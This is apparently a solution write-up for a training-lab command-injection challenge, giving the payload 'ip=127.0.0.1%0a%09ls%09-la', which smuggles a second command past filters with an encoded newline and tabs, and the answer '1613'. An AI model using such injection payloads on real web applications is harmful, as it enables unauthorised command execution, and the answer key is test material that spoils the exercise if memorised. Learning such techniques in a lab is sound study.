## Challenge

Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file? 

## Solution

I use the following command:

```sh
ip=127.0.0.1%0a%09ls%09-la
```

which executes the command `ls -la`, and provides me with the answer:

```sh
1613 Jul 16  2021 index.php
```

so the answer is `1613`.
